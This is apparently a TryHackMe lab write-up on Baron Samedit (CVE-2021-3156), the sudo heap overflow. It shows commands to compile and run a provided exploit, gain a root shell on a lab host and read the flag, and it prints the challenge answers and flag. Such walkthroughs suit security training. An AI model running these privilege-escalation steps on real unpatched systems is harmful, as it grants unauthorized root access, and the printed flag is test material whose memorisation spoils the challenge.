# Baron Samedit

This was a heap buffer overflow allowing any user to escalate privileges to root -- no misconfigurations required. This exploit works with the default settings, for any user regardless of sudo permissions, which makes it all the scarier. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1.

## Task 2 Baron Samedit

#### After compiling the exploit, what is the name of the executable created?

```bash
ssh tryhackme@10.10.54.198
cd Exploit/
make
ls -lA
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 18-31-26.png>)

{% hint style="success" %}
`sudo-hax-me-a-sandwich`
{% endhint %}

#### Run the exploit! You should now have a root shell -- what is the flag in `/root/flag.txt`?

```bash
./sudo-hax-me-a-sandwich
cat /etc/issue
./sudo-hax-me-a-sandwich 0
cat /root/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-04 18-33-26.png>)

{% hint style="success" %}
`THM{NmU4OWYwMWJmMjkxMDdiYTU4MWIxNWVk}`
{% endhint %}

## Reference

{% embed url="https://github.com/blasty/CVE-2021-3156" %}
